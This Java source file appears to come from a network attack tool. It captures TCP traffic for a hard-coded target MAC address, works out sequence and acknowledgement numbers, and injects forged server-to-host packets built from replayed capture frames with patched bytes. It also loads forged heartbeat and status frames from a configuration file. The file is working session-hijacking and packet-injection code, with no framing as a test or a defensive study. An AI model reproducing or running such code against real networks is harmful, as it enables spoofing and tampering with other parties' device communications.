package Manager.Listenner;

import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Properties;
import java.util.concurrent.BlockingQueue;

import Model.ConterData;
import Model.Model_a;
import Util.DealPcap.wireless802_airdump1;
import Util.SetPacket.SetTCP;
import jpcap.packet.Packet;
import jpcap.packet.TCPPacket;

public class Counter_yinshi implements PackageListenner {

	private Packet packet;
	private String hostMAC = "46:19:b6:0f:f9:1d"; 
	private String dataType = "TCP";
	private ConterData conterData = new ConterData();
	private int flag=0;
	List<Packet> sendPackets = new ArrayList<Packet>();
	
	
	BlockingQueue<Packet> sendQueue;
	
	{
		
		readProperties();
		
	}
	
	public static void main(String[] args){
		
		
	Counter_yinshi yinshi = new Counter_yinshi();
		
		System.out.println(yinshi.conterData.getCounter_data_list().get(0).getData_byte().length);
	}
	
	
	public Counter_yinshi(BlockingQueue<Packet> sendQueue){
		
		this.sendQueue = sendQueue;
				
	}
	
	public Counter_yinshi(){
		
	}

	
	@Override
	public void listenPackage(String  yourMAC,String hostMAC,Packet Packet,String routeMAC,String host_ip) {
		
		
		if(this.hostMAC.equals(hostMAC)){
			if(Packet instanceof TCPPacket){
				
				TCPPacket tcpPacket = (TCPPacket)Packet;
				


				// TODO Auto-generated method stub

				   
				   SetTCP st = new SetTCP();
				   TCPPacket tcp = null;
				   
				   //int total = counter_data_list.size();
				   
				 
				   //我门要伪造的数据是伪造为服务器发给主机的
				   //先计算出seq ack
				   
				   long seq = 0;
				   long ack = 0;
				   
				   if(tcpPacket.syn){
					   
					   //SYN握手帧
					   
				   }
				   else if(tcpPacket.ack && !tcpPacket.psh){

						   seq = tcpPacket.ack_num;
						   ack = tcpPacket.sequence;       
						   
				   }
				   else if(tcpPacket.ack && tcpPacket.psh){
					   
					   
					   //计算SEQ和ACK
					   seq = tcpPacket.ack_num;
					   ack = tcpPacket.sequence + tcpPacket.data.length;	  
				 }   
				   
				   //是主机发往服务器的数据ack或者330和99，就直接转发给服务器
				   if(tcpPacket.src_ip.getHostAddress().equals(host_ip)){
					   
					   
					   		//if(flag ==1){
					   			//if(tcpPacket.data.length == 0 && tcpPacket.ack&&!tcpPacket.psh){
					   			//伪造数据	
					   
					   				if(flag==0){
					   					int total = 0;
					   					sendPackets.add(tcpPacket);
					   					
					   					for(int i =0;i<sendPackets.size();i++){
					   						
					   						total+=sendPackets.get(i).data.length;
					   					}
					   					System.out.println("累计数据："+total);
					   					if(total==281){
					   						sendPackets.clear();
					   						////////////////
					   						if(conterData.getCounter_data_list().size()!=0){
							   					
							   					tcp =  st.fakePacket(tcpPacket.dst_port, tcpPacket.src_port, 
										    			 seq, ack, tcpPacket.dst_ip.getHostAddress(), tcpPacket.src_ip.getHostAddress(),
										    			 yourMAC, hostMAC, changData(conterData.getCounter_data_list().get(0)));
							   					sendPackets.add(tcp);
							   					conterData.getCounter_data_list().remove(0);
							   					
							   					System.out.println("已将反制数据加入发送队列"+"To host   seq|"+tcp.sequence+" ack|"+tcp.ack_num+"  frameLen|"+tcp.data.length);
							   				
							   					//反制数据发送完成标志
							   					flag = 1;
							   				}
					   						//////////////
					   					}
					   				}
					   
					   				
					   				
					   			//}
					   			
					   		//}
					   		
					   	/* 	else if(flag == 2){
					   			
					   			//flag=2后 开始伪造数据来发送，暂时只伪造ACK数据
					   			//完成数据发送后，在收到数据帧后回复ACK
					   			if(tcpPacket.data.length>0){
					   				
					   				tcp =  st.fakePacket(tcpPacket.dst_port, tcpPacket.src_port, 
							    			 seq, ack, tcpPacket.dst_ip.getHostAddress(), tcpPacket.src_ip.getHostAddress(),
							    			 yourMAC, hostMAC,null);
				   					sendPackets.add(tcp);
					   				
				   					System.out.println("伪造ACK数据To host   seq|"+tcp.sequence+" ack|"+tcp.ack_num+"  frameLen|"+tcp.data.length);	
					   			}
							}
					   		
					   	
					  		else {
							  System.out.println("等待转发数据......");
							  tcp =  st.fakePacket( tcpPacket.src_port, tcpPacket.dst_port,
						    			 tcpPacket.sequence, tcpPacket.ack_num,  tcpPacket.src_ip.getHostAddress(),tcpPacket.dst_ip.getHostAddress(),
						    			 yourMAC, routeMAC, new Model_a().setData_byte(tcpPacket.data));
							   
							   sendPackets.add(tcp);
							   System.out.println("等待发送 To Service   seq|"+tcp.sequence+" ack|"+tcp.ack_num+"  frameLen|"+tcp.data.length); 
						   }*/
				   }
				   
				   
				   //服务器发往主机的数据
				   //如果抓取到216帧 就伪造数据，抓到80的ACK，则转发
				   else if(tcpPacket.dst_ip.getHostAddress().equals(host_ip)){/*
					   
					   if(flag == 2){
						   
						   //暂时不管伪造数据完成后时候的服务器端
					   }
					   else if(tcpPacket.data.length == 0&&tcpPacket.ack&&!tcpPacket.psh){
						  System.out.println("准备转发数据......");
						  tcp =  st.fakePacket( tcpPacket.src_port, tcpPacket.dst_port,
					    			 tcpPacket.sequence, tcpPacket.ack_num,  tcpPacket.src_ip.getHostAddress(),tcpPacket.dst_ip.getHostAddress(),
					    			 yourMAC, routeMAC, new Model_a().setData_byte(tcpPacket.data));
						   
						   sendPackets.add(tcp);
						   System.out.println("转发数据To host   seq|"+tcp.sequence+" ack|"+tcp.ack_num+"  frameLen|"+tcp.data.length); 
						  
						  
					  }else if(tcpPacket.data.length == 142){
						
						  System.out.println("反制启动......flag=1");
						  tcp =  st.fakePacket( tcpPacket.src_port, tcpPacket.dst_port,
					    			 tcpPacket.sequence, tcpPacket.ack_num,  tcpPacket.src_ip.getHostAddress(),tcpPacket.dst_ip.getHostAddress(),
					    			 yourMAC, routeMAC, new Model_a().setData_byte(tcpPacket.data));
						   
						   sendPackets.add(tcp);
						   System.out.println("转发数据To host   seq|"+tcp.sequence+" ack|"+tcp.ack_num+"  frameLen|"+tcp.data.length); 
						   
						   
						   //接收到142帧以后同时伪造数据
						   if(conterData.getCounter_data_list().size()!=0){
							   
							   Model_a m = changData(conterData.getCounter_data_list().get(0));
							   
			   					tcp =  st.fakePacket(tcpPacket.dst_port, tcpPacket.src_port, 
						    			 (tcpPacket.sequence+tcpPacket.data.length), tcpPacket.ack_num,  tcpPacket.src_ip.getHostAddress(),tcpPacket.dst_ip.getHostAddress(),
						    			 yourMAC, hostMAC, m);
			   					sendPackets.add(tcp);
			   					conterData.getCounter_data_list().remove(0);
			   					
			   					System.out.println("已将反制数据加入发送队列"+"To host   seq|"+tcp.sequence+" ack|"+tcp.ack_num+"  frameLen|"+tcp.data.length);
			   				
			   					//反制数据发送完成标志
			   					flag = 2;
			   				}
						   
						   //反制启动标志
						  flag =1;
					}
					   		
				   */}
				 
				   
				   if(sendPackets.size()!= 0){
					   try {
						  
						   /*if(flag==0){
							   
							   int total = 0;
							   
							   for(Packet packet : sendPackets){
								   
								   total += packet.data.length;
							   }
							   
							   
							   System.out.println("累计数据:"+total);
							   
							   if( total == 281){
								   for(Packet packet:sendPackets){
									   sendQueue.put(packet);
								   }
								   sendPackets.clear();
							   }
							   
						   }
						   else */if(flag==1){
							   for(Packet packet:sendPackets){
								   sendQueue.put(packet);
							   }
							   sendPackets.clear();
							   flag=2;
						}
						   
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				   }
				   
					
			
				
			}
		}
		
		
	}

		@Override
		public Packet instance() {
			
			return this.packet;
		}
		
		
		public Model_a changData(Model_a model){
			
			byte[] data = model.getData_byte();
			
			data[9] = (byte) 0xf2;
			data[10] = (byte) 0x12;
			data[11] = (byte) 0x14;
			
			model.setData_byte(data);
			/*data[9] = new Byte("");
			data[10] = new Byte("");
			data[11] = new Byte("");*/
			return model;
		}
		
		
		
		
	/*************************************************
	 * 读取配置文件prameter.properties
	 *************************************************/
	  public void readProperties(){
		  
		    wireless802_airdump1 w = new wireless802_airdump1();
		  
		  
			Properties prop = new Properties();
			
			InputStream in = Object. class .getResourceAsStream( "/counterProperties_yinshi.properties" );   
			
			
	        try  {    
	           prop.load(in);    
	           
	           String COUNTER_DATASOURCE =  prop.getProperty( "COUNTER_DATASOURCE" ).trim();
	           
	           
	           int[] INT_INDEX = null;
	           String[] ss1  =  prop.getProperty( "INT_INDEX" ).trim().split(",");
	           if(ss1.length != 0){ 
	        	   INT_INDEX = new int[ss1.length];
	        	   for(int i = 0;i<ss1.length;i++){  
		        	   INT_INDEX[i] = Integer.parseInt(ss1[i]);
		           } 
	           }
	           
	           
	           int[] HEART_INDEX_UP= null;
	           String[] ss2 =  prop.getProperty( "HEART_INDEX_UP" ).trim().split(",");
	           if(!ss2[0].equals("")){ 
	        	   HEART_INDEX_UP = new int[ss2.length];
	        	   for(int i = 0;i<ss2.length;i++){  
	        		   HEART_INDEX_UP[i] = Integer.parseInt(ss2[i]);
		           } 
	           }
	           
	           
	           int[] HEART_INDEX_DOWN = null;
	           String[] ss3 =  prop.getProperty( "HEART_INDEX_DOWN" ).trim().split(",");
	           if(!ss3[0].equals("")){ 
	        	   HEART_INDEX_DOWN = new int[ss3.length];
	        	   for(int i = 0;i<ss3.length;i++){  
	        		   HEART_INDEX_DOWN[i] = Integer.parseInt(ss3[i]);
		           } 
	           }
	           
	           int[] STATUS_INDEX_TOSERVICE = null;
	           String[] ss4 =  prop.getProperty( "STATUS_INDEX_TOSERVICE" ).trim().split(",");
	           if(!ss4[0].equals("")){ 
	        	   STATUS_INDEX_TOSERVICE = new int[ss4.length];
	        	   for(int i = 0;i<ss4.length;i++){  
	        		   STATUS_INDEX_TOSERVICE[i] = Integer.parseInt(ss4[i]);
		           } 
	           }
	           
	           
	           
	         //还需要识别一个正常情况下服务与主机的心跳数据，可以完整的与主机通信
				
				List<Model_a> ls = w.ergodic(COUNTER_DATASOURCE);
				List<Model_a> counter_data_list = w.getFrameByindex(INT_INDEX,ls);
				
				if(counter_data_list.size() != 0){
					System.out.println("分析成功！生成反制数据队列........");
					System.out.println("length:"+counter_data_list.size());
					conterData.setCounter_data_list(counter_data_list);
				}else {
					System.out.println("反制队列获取失败");
				}
				
				if(HEART_INDEX_UP !=null && HEART_INDEX_UP.length != 0 ){
					List<Model_a> counter_heart_list_toService = w.getFrameByindex(HEART_INDEX_UP, ls);	
					if(counter_heart_list_toService.size() != 0){
						System.out.println("分析成功！生成伪造心跳数据toService........");
						System.out.println("length:"+counter_heart_list_toService.size());
						conterData.setCounter_heart_list_toService(counter_heart_list_toService);
					}
				}else {
					System.out.println("未启用完整反制模式，心跳数据toService未启用");
				}
				
				if(HEART_INDEX_DOWN !=null && HEART_INDEX_DOWN.length != 0 ){
					List<Model_a> counter_heart_list_toHost = w.getFrameByindex(HEART_INDEX_DOWN, ls);	
					if(counter_heart_list_toHost.size() != 0){
						System.out.println("分析成功！生成伪造心跳数据toHost........");
						System.out.println("length:"+counter_heart_list_toHost.size());
						conterData.setCounter_heart_list_toHost(counter_heart_list_toHost);
					}
				}else {
					System.out.println("未启用完整反制模式，心跳数据toHost未启用");
				}
				
				
				if( STATUS_INDEX_TOSERVICE != null && STATUS_INDEX_TOSERVICE.length != 0){
					List<Model_a> fake_status_list_toService = w.getFrameByindex(STATUS_INDEX_TOSERVICE, ls);	
					if(fake_status_list_toService.size() != 0){
						System.out.println("分析成功！生成伪造状态数据toService........");
						System.out.println("length:"+fake_status_list_toService.size());
						conterData.setFake_status_list_toService(fake_status_list_toService);
					}
				}
	           
	       }  catch  (IOException e) {    
	           e.printStackTrace();    
	       }  
	         
	  }
	  /*************************************************
	 * end
	 *************************************************/


	public BlockingQueue<Packet> getSendQueue() {
		return sendQueue;
	}


	public void setSendQueue(BlockingQueue<Packet> sendQueue) {
		this.sendQueue = sendQueue;
	}


	@Override
	public int successFlag() {
		// TODO Auto-generated method stub
		return 0;
	}

}
